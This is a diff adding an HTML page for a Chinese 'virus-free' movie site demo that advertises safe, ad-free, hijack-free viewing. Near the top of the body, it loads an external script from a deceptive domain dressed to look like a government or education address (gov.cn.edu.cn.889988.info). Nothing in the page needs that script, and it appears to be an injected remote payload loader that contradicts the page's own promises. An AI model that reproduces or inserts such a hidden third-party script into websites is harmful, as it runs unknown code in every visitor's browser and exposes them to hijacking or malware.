@@ -1,0 +1,481 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover" />
+<title>无毒电影网 - 纯净高清电影在线观看 | wududianyingwang-h5.github.io</title>
+<meta name="description" content="无毒电影网（wududianyingwang-h5.github.io）提供纯净无广告的高清电影、剧集、动漫资源。绿色安全，极速播放，移动端自适应，您的专属安全观影站。" />
+<meta name="keywords" content="无毒电影网,wududianyingwang-h5,纯净电影,无广告电影,高清电影,安全观影,绿色电影网" />
+<link rel="canonical" href="https://wududianyingwang-h5.github.io/" />
+<style>
+:root {
+  --bg: #f0f7f4;
+  --card: #ffffff;
+  --line: #d2e8db;
+  --txt: #2c4a3b;
+  --sub: #5a7d6b;
+  --primary: #00b36b; /* 安全绿 */
+  --secondary: #0099cc; /* 科技蓝 */
+  --accent: #ff6b6b; /* 警示红（用于对比） */
+  --radius: 16px;
+  --maxw: 1200px;
+  --shadow: 0 8px 24px rgba(0, 179, 107, 0.08);
+}
+* { box-sizing: border-box; }
+html, body { margin: 0; padding: 0; }
+body {
+  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", "PingFang SC", "Microsoft YaHei", sans-serif;
+  background-color: var(--bg);
+  color: var(--txt);
+  line-height: 1.6;
+  -webkit-font-smoothing: antialiased;
+}
+a { color: inherit; text-decoration: none; }
+.wrap { max-width: var(--maxw); margin: 0 auto; padding: 0 16px; }
+
+/* 顶部导航 */
+header.site {
+  position: sticky; top: 0; z-index: 100;
+  background: rgba(255, 255, 255, 0.95);
+  backdrop-filter: blur(12px);
+  border-bottom: 1px solid var(--line);
+}
+.nav { display: flex; align-items: center; height: 64px; gap: 20px; }
+.logo {
+  font-size: 22px; font-weight: 900; color: var(--primary);
+  display: flex; align-items: center; gap: 8px;
+}
+.logo::before { content: '🛡️'; font-size: 24px; }
+.logo small { font-size: 12px; color: var(--sub); font-weight: 500; }
+.menu { display: flex; gap: 12px; margin-left: auto; }
+.menu a {
+  padding: 8px 16px; border-radius: 20px; font-size: 14px; font-weight: 600; color: var(--sub);
+  transition: all 0.3s;
+}
+.menu a:hover { background: var(--primary); color: #fff; }
+.search-bar { display: flex; background: var(--bg); border-radius: 20px; padding: 4px; border: 1px solid var(--line); }
+.search-bar input { border: none; background: transparent; padding: 6px 12px; outline: none; color: var(--txt); width: 160px; }
+.search-bar button { background: var(--primary); color: #fff; border: none; border-radius: 16px; padding: 6px 16px; cursor: pointer; font-weight: bold; }
+.burger { display: none; background: none; border: none; font-size: 24px; color: var(--primary); cursor: pointer; }
+
+/* 首屏 Hero - 纯净宣言 */
+.hero-clean {
+  padding: 60px 0 40px; text-align: center; position: relative; overflow: hidden;
+}
+.hero-clean::before {
+  content: ''; position: absolute; top: -50%; left: -50%; width: 200%; height: 200%;
+  background: radial-gradient(circle, rgba(0,179,107,0.05) 0%, transparent 60%);
+  animation: pulse 10s infinite linear; z-index: -1;
+}
+@keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.1); } 100% { transform: scale(1); } }
+.hero-badge {
+  display: inline-block; background: #e6f7ef; color: var(--primary); padding: 6px 16px;
+  border-radius: 20px; font-size: 14px; font-weight: bold; margin-bottom: 20px; border: 1px solid var(--line);
+}
+.hero-clean h1 { font-size: 48px; margin: 0 0 16px; color: #1a3328; line-height: 1.2; }
+.hero-clean h1 span { color: var(--primary); }
+.hero-clean p { font-size: 18px; color: var(--sub); max-width: 600px; margin: 0 auto 30px; }
+.hero-cta {
+  display: inline-flex; gap: 16px;
+}
+.btn {
+  padding: 14px 32px; border-radius: 30px; font-size: 16px; font-weight: bold; cursor: pointer; transition: transform 0.2s; border: none;
+}
+.btn:hover { transform: translateY(-2px); }
+.btn-primary { background: var(--primary); color: #fff; box-shadow: 0 8px 20px rgba(0,179,107,0.3); }
+.btn-outline { background: transparent; color: var(--primary); border: 2px solid var(--primary); }
+
+/* 核心优势 - 盾牌布局 */
+.features { display: grid; grid-template-columns: repeat(4, 1fr); gap: 24px; padding: 40px 0; }
+.feature-card {
+  background: var(--card); border-radius: var(--radius); padding: 30px 20px; text-align: center;
+  border: 1px solid var(--line); box-shadow: var(--shadow); transition: all 0.3s;
+}
+.feature-card:hover { transform: translateY(-5px); border-color: var(--primary); }
+.feature-icon { font-size: 40px; margin-bottom: 16px; display: block; }
+.feature-card h3 { margin: 0 0 10px; color: #1a3328; }
+.feature-card p { margin: 0; font-size: 14px; color: var(--sub); }
+
+/* 栏目 1: 纯净片库 (网格) */
+.section { padding: 60px 0; }
+.sec-head { display: flex; justify-content: space-between; align-items: flex-end; margin-bottom: 30px; }
+.sec-head h2 { font-size: 28px; margin: 0; display: flex; align-items: center; gap: 10px; }
+.sec-head h2::before { content: ''; display: block; width: 6px; height: 24px; background: var(--primary); border-radius: 3px; }
+.sec-head a { color: var(--secondary); font-weight: bold; font-size: 14px; }
+
+.grid-movies { display: grid; grid-template-columns: repeat(auto-fill, minmax(180px, 1fr)); gap: 20px; }
+.movie-card {
+  background: var(--card); border-radius: var(--radius); overflow: hidden; border: 1px solid var(--line);
+  position: relative;
+}
+.movie-cover {
+  height: 240px; position: relative; overflow: hidden;
+}
+/* 模拟封面渐变 */
+.movie-card:nth-child(1) .movie-cover { background: linear-gradient(135deg, #a8e6cf, #3d84a8); }
+.movie-card:nth-child(2) .movie-cover { background: linear-gradient(135deg, #ffd3b6, #ff8b94); }
+.movie-card:nth-child(3) .movie-cover { background: linear-gradient(135deg, #d4a5a5, #5c3d5c); }
+.movie-card:nth-child(4) .movie-cover { background: linear-gradient(135deg, #99b898, #2a363b); }
+.movie-card:nth-child(5) .movie-cover { background: linear-gradient(135deg, #ffcc5c, #ff6f69); }
+.movie-card:nth-child(6) .movie-cover { background: linear-gradient(135deg, #88d8b0, #247ba0); }
+
+.safety-tag {
+  position: absolute; top: 10px; right: 10px; background: rgba(0,0,0,0.6); color: #4caf50;
+  padding: 4px 8px; border-radius: 4px; font-size: 12px; font-weight: bold; display: flex; align-items: center; gap: 4px;
+}
+.movie-info { padding: 15px; }
+.movie-info h3 { margin: 0 0 8px; font-size: 16px; color: #1a3328; }
+.movie-info p { margin: 0; font-size: 13px; color: var(--sub); display: flex; justify-content: space-between; }
+
+/* 栏目 2: 安全分类 (标签云) */
+.cats-container { background: var(--card); border-radius: var(--radius); padding: 30px; border: 1px solid var(--line); }
+.cat-row { margin-bottom: 20px; }
+.cat-row:last-child { margin-bottom: 0; }
+.cat-title { font-weight: bold; color: var(--txt); margin-bottom: 12px; font-size: 15px; }
+.cat-tags { display: flex; flex-wrap: wrap; gap: 10px; }
+.cat-tag {
+  padding: 8px 18px; background: var(--bg); border: 1px solid var(--line); border-radius: 20px;
+  font-size: 14px; color: var(--sub); cursor: pointer; transition: all 0.2s;
+}
+.cat-tag:hover { background: var(--primary); color: #fff; border-color: var(--primary); }
+.cat-tag.hot { color: var(--accent); border-color: #ffd6d6; background: #fff0f0; }
+.cat-tag.hot:hover { background: var(--accent); color: #fff; }
+
+/* 栏目 3: 纯净放映史 (时间轴) */
+.timeline { position: relative; padding-left: 30px; }
+.timeline::before {
+  content: ''; position: absolute; left: 7px; top: 0; bottom: 0; width: 2px; background: var(--line);
+}
+.t-item { position: relative; margin-bottom: 30px; }
+.t-dot {
+  position: absolute; left: -30px; top: 5px; width: 16px; height: 16px; border-radius: 50%;
+  background: #fff; border: 3px solid var(--primary); box-shadow: 0 0 0 3px rgba(0,179,107,0.1);
+}
+.t-content {
+  background: var(--card); border: 1px solid var(--line); border-radius: var(--radius); padding: 20px;
+  box-shadow: var(--shadow);
+}
+.t-date { font-size: 12px; color: var(--primary); font-weight: bold; margin-bottom: 8px; }
+.t-content h3 { margin: 0 0 10px; font-size: 18px; }
+.t-content p { margin: 0; font-size: 14px; color: var(--sub); }
+
+/* 栏目 4: 观影防护指南 (双栏对比) */
+.guide-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 30px; }
+.guide-box {
+  border-radius: var(--radius); padding: 30px; color: #fff;
+}
+.guide-bad { background: linear-gradient(135deg, #ff6b6b, #ff8e53); }
+.guide-good { background: linear-gradient(135deg, #00b36b, #00cc99); }
+.guide-box h3 { margin: 0 0 20px; font-size: 20px; display: flex; align-items: center; gap: 10px; }
+.guide-list { list-style: none; padding: 0; margin: 0; }
+.guide-list li { padding: 12px 0; border-bottom: 1px solid rgba(255,255,255,0.2); font-size: 15px; display: flex; align-items: flex-start; gap: 10px; }
+.guide-list li:last-child { border-bottom: none; }
+.guide-list li::before { content: '✕'; font-weight: bold; }
+.guide-good .guide-list li::before { content: '✓'; }
+
+/* 页脚 */
+footer.site {
+  background: #1a3328; color: #8ba89c; padding: 50px 0 20px; margin-top: 60px;
+}
+.footer-content { display: grid; grid-template-columns: 2fr 1fr 1fr; gap: 40px; margin-bottom: 40px; }
+.footer-logo { font-size: 24px; font-weight: bold; color: #fff; margin-bottom: 16px; }
+.footer-logo span { color: var(--primary); }
+.footer-text { font-size: 14px; line-height: 1.8; }
+.footer-col h4 { color: #fff; margin: 0 0 20px; font-size: 16px; }
+.footer-col ul { list-style: none; padding: 0; margin: 0; }
+.footer-col ul li { margin-bottom: 12px; }
+.footer-col a { color: #8ba89c; transition: color 0.2s; }
+.footer-col a:hover { color: var(--primary); }
+.footer-bottom {
+  border-top: 1px solid rgba(255,255,255,0.1); padding-top: 20px; text-align: center; font-size: 13px;
+}
+
+/* 响应式 */
+@media (max-width: 900px) {
+  .features { grid-template-columns: repeat(2, 1fr); }
+  .guide-grid { grid-template-columns: 1fr; }
+  .footer-content { grid-template-columns: 1fr; }
+}
+@media (max-width: 768px) {
+  .menu { display: none; flex-direction: column; position: absolute; top: 64px; left: 0; right: 0; background: #fff; padding: 20px; box-shadow: 0 10px 20px rgba(0,0,0,0.1); }
+  .menu.active { display: flex; }
+  .burger { display: block; margin-left: auto; }
+  .search-bar { display: none; }
+  .hero-clean h1 { font-size: 32px; }
+  .sec-head { flex-direction: column; align-items: flex-start; gap: 10px; }
+  .grid-movies { grid-template-columns: repeat(2, 1fr); }
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<header class="site">
+  <div class="wrap nav">
+    <div class="logo">无毒电影网<small>wududianyingwang-h5</small></div>
+    <nav class="menu" id="menu">
+      <a href="#home">首页</a>
+      <a href="#library">纯净片库</a>
+      <a href="#category">安全分类</a>
+      <a href="#timeline">更新日志</a>
+      <a href="#guide">防护指南</a>
+    </nav>
+    <div class="search-bar">
+      <input type="text" placeholder="搜索纯净影片..." aria-label="搜索" />
+      <button type="button" onclick="alert('演示站：搜索功能已占位')">搜索</button>
+    </div>
+    <button class="burger" id="burger" aria-label="菜单">☰</button>
+  </div>
+</header>
+
+<main class="wrap">
+  <!-- 首屏 -->
+  <section class="hero-clean" id="home">
+    <div class="hero-badge">🛡️ 100% 绿色安全认证</div>
+    <h1>纯净观影，<span>无毒</span>无广告</h1>
+    <p>无毒电影网致力于打造最干净的高清影视资源库。拒绝弹窗，拒绝捆绑，拒绝恶意跳转，为您提供一个安心的观影环境。</p>
+    <div class="hero-cta">
+      <button class="btn btn-primary" onclick="location.href='#library'">进入纯净片库</button>
+      <button class="btn btn-outline" onclick="location.href='#guide'">查看防护指南</button>
+    </div>
+  </section>
+
+  <!-- 核心优势 -->
+  <section class="features">
+    <div class="feature-card">
+      <span class="feature-icon">🚫</span>
+      <h3>无弹窗广告</h3>
+      <p>彻底屏蔽干扰弹窗，观影过程一气呵成。</p>
+    </div>
+    <div class="feature-card">
+      <span class="feature-icon">🔒</span>
+      <h3>安全链接</h3>
+      <p>全站HTTPS加密，杜绝恶意劫持与捆绑。</p>
+    </div>
+    <div class="feature-card">
+      <span class="feature-icon">⚡</span>
+      <h3>极速加载</h3>
+      <p>优化线路，高清画质也能秒开播放。</p>
+    </div>
+    <div class="feature-card">
+      <span class="feature-icon">📱</span>
+      <h3>移动优先</h3>
+      <p>完美适配手机与平板，随时随地纯净看。</p>
+    </div>
+  </section>
+
+  <!-- 栏目 1: 纯净片库 -->
+  <section class="section" id="library">
+    <div class="sec-head">
+      <h2>纯净片库</h2>
+      <a href="#">浏览全部 #</a>
+    </div>
+    <div class="grid-movies">
+      <div class="movie-card">
+        <div class="movie-cover"><div class="safety-tag">✓ 已检测</div></div>
+        <div class="movie-info">
+          <h3>绿野仙踪2026</h3>
+          <p><span>奇幻/冒险</span> <span>9.2分</span></p>
+        </div>
+      </div>
+      <div class="movie-card">
+        <div class="movie-cover"><div class="safety-tag">✓ 已检测</div></div>
+        <div class="movie-info">
+          <h3>深海净化</h3>
+          <p><span>科幻/动作</span> <span>8.8分</span></p>
+        </div>
+      </div>
+      <div class="movie-card">
+        <div class="movie-cover"><div class="safety-tag">✓ 已检测</div></div>
+        <div class="movie-info">
+          <h3>云端之上</h3>
+          <p><span>剧情/治愈</span> <span>9.0分</span></p>
+        </div>
+      </div>
+      <div class="movie-card">
+        <div class="movie-cover"><div class="safety-tag">✓ 已检测</div></div>
+        <div class="movie-info">
+          <h3>代码卫士</h3>
+          <p><span>悬疑/科技</span> <span>8.5分</span></p>
+        </div>
+      </div>
+      <div class="movie-card">
+        <div class="movie-cover"><div class="safety-tag">✓ 已检测</div></div>
+        <div class="movie-info">
+          <h3>清风徐来</h3>
+          <p><span>爱情/文艺</span> <span>8.7分</span></p>
+        </div>
+      </div>
+      <div class="movie-card">
+        <div class="movie-cover"><div class="safety-tag">✓ 已检测</div></div>
+        <div class="movie-info">
+          <h3>钢铁防线</h3>
+          <p><span>战争/历史</span> <span>9.1分</span></p>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 栏目 2: 安全分类 -->
+  <section class="section" id="category">
+    <div class="sec-head">
+      <h2>安全分类</h2>
+      <a href="#">全部分类 #</a>
+    </div>
+    <div class="cats-container">
+      <div class="cat-row">
+        <div class="cat-title">按类型 (安全指数)</div>
+        <div class="cat-tags">
+          <span class="cat-tag hot">动作大片</span>
+          <span class="cat-tag">科幻未来</span>
+          <span class="cat-tag">悬疑推理</span>
+          <span class="cat-tag">喜剧搞笑</span>
+          <span class="cat-tag">爱情文艺</span>
+          <span class="cat-tag">动画卡通</span>
+        </div>
+      </div>
+      <div class="cat-row">
+        <div class="cat-title">按地区 (资源纯净度)</div>
+        <div class="cat-tags">
+          <span class="cat-tag">华语精选</span>
+          <span class="cat-tag hot">好莱坞</span>
+          <span class="cat-tag">欧洲文艺</span>
+          <span class="cat-tag">日韩佳作</span>
+          <span class="cat-tag">印度电影</span>
+        </div>
+      </div>
+      <div class="cat-row">
+        <div class="cat-title">按年份 (最新收录)</div>
+        <div class="cat-tags">
+          <span class="cat-tag hot">2026</span>
+          <span class="cat-tag">2025</span>
+          <span class="cat-tag">2024</span>
+          <span class="cat-tag">经典老片</span>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 栏目 3: 纯净放映史 (时间轴) -->
+  <section class="section" id="timeline">
+    <div class="sec-head">
+      <h2>更新日志</h2>
+      <a href="#">更多记录 #</a>
+    </div>
+    <div class="timeline">
+      <div class="t-item">
+        <div class="t-dot"></div>
+        <div class="t-content">
+          <div class="t-date">2026年10月10日</div>
+          <h3>新增100部高清修复经典老片</h3>
+          <p>无毒电影网持续扩充片库，本次更新包含多部奥斯卡获奖影片的4K修复版，已通过安全检测，可放心观看。</p>
+        </div>
+      </div>
+      <div class="t-item">
+        <div class="t-dot"></div>
+        <div class="t-content">
+          <div class="t-date">2026年10月05日</div>
+          <h3>全面升级HTTPS加密协议</h3>
+          <p>为了进一步保障用户的隐私安全，本站已全面升级至TLS 1.3协议，确保观影数据零泄露。</p>
+        </div>
+      </div>
+      <div class="t-item">
+        <div class="t-dot"></div>
+        <div class="t-content">
+          <div class="t-date">2026年09月28日</div>
+          <h3>拦截系统升级，过滤99%恶意广告</h3>
+          <p>更新了前端拦截规则，彻底屏蔽了第三方跟踪脚本和恶意弹窗，打造真正的“无毒”环境。</p>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 栏目 4: 观影防护指南 -->
+  <section class="section" id="guide">
+    <div class="sec-head">
+      <h2>观影防护指南</h2>
+    </div>
+    <div class="guide-grid">
+      <div class="guide-box guide-bad">
+        <h3>⚠️ 普通网站风险</h3>
+        <ul class="guide-list">
+          <li>强制跳转至博彩或色情页面</li>
+          <li>伪装成播放键的欺诈广告</li>
+          <li>后台静默下载恶意软件</li>
+          <li>窃取浏览器Cookie信息</li>
+          <li>频繁弹窗导致设备卡顿</li>
+        </ul>
+      </div>
+      <div class="guide-box guide-good">
+        <h3>✅ 无毒电影网承诺</h3>
+        <ul class="guide-list">
+          <li>零跳转，专注内容本身</li>
+          <li>纯净界面，无伪装按钮</li>
+          <li>严格审核，无捆绑下载</li>
+          <li>HTTPS加密，保护隐私</li>
+          <li>轻量设计，流畅不卡顿</li>
+        </ul>
+      </div>
+    </div>
+  </section>
+</main>
+
+<footer class="site">
+  <div class="wrap">
+    <div class="footer-content">
+      <div>
+        <div class="footer-logo">无毒电影网 <span>· 纯净版</span></div>
+        <p class="footer-text">
+          无毒电影网（wududianyingwang-h5.github.io）是一个专注于提供绿色、安全、高清影视资源的演示站点。<br>
+          我们拒绝一切形式的恶意广告和捆绑，只为给您带来最纯粹的观影体验。
+        </p>
+      </div>
+      <div class="footer-col">
+        <h4>快速链接</h4>
+        <ul>
+          <li><a href="#home">返回顶部</a></li>
+          <li><a href="#library">最新电影</a></li>
+          <li><a href="#category">影片分类</a></li>
+          <li><a href="#guide">防护指南</a></li>
+        </ul>
+      </div>
+      <div class="footer-col">
+        <h4>关于我们</h4>
+        <ul>
+          <li><a href="#">关于无毒</a></li>
+          <li><a href="#">免责声明</a></li>
+          <li><a href="#">隐私保护</a></li>
+          <li><a href="#">联系我们</a></li>
+        </ul>
+      </div>
+    </div>
+    <div class="footer-bottom">
+      © 2026 无毒电影网 Demo · 单页影视导航演示，仅用于静态站 / SEO / 移动端适配演示。<br>
+      所有播放 / 详情 / 分类链接均使用 # 占位，不提供真实盗版资源。
+    </div>
+  </div>
+</footer>
+
+<script>
+  // 移动端菜单切换
+  const burger = document.getElementById('burger');
+  const menu = document.getElementById('menu');
+  burger.addEventListener('click', () => {
+    menu.classList.toggle('active');
+  });
+
+  // 平滑滚动
+  document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+    anchor.addEventListener('click', function (e) {
+      e.preventDefault();
+      const target = document.querySelector(this.getAttribute('href'));
+      if (target) {
+        target.scrollIntoView({ behavior: 'smooth' });
+        menu.classList.remove('active');
+      }
+    });
+  });
+</script>
+</body>
+</html>
